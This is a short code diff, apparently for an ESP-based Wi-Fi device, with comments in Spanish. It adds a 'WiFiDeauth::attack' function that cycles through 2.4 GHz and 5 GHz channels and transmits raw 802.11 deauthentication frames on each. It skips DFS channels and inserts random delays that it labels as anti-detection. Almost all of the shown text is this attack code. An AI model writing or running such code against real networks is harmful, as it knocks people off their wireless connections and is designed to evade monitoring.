@@ -42,3 +42,18 @@ void WiFiDeauth::send_deauth(uint8_t* mac) {
     // Verificación de error (opcional)
     // if (esp_wifi_80211_tx(..., ...) != ESP_OK) {...}
 }
+
+void WiFiDeauth::attack(bool is_5ghz, uint8_t* mac) {
+    const uint8_t* channels = is_5ghz ? channels_5ghz : channels_24ghz;
+    int num_channels = is_5ghz ? sizeof(channels_5ghz)/sizeof(channels_5ghz[0]) : 13;
+
+    for (int i = 0; i < num_channels; i++) {
+        if (is_5ghz && (channels[i] >= 120 && channels[i] <= 128)) continue; // Evita DFS
+        
+        wext_set_channel("wlan0", channels[i]);
+        if (wifi_send_pkt_freedom(deauth_frame, 26, 0) != 0) {
+            Serial.printf("[ERROR] Canal %d falló\n", channels[i]);
+        }
+        delay(random(50, 200)); // Anti-detección
+    }
+}
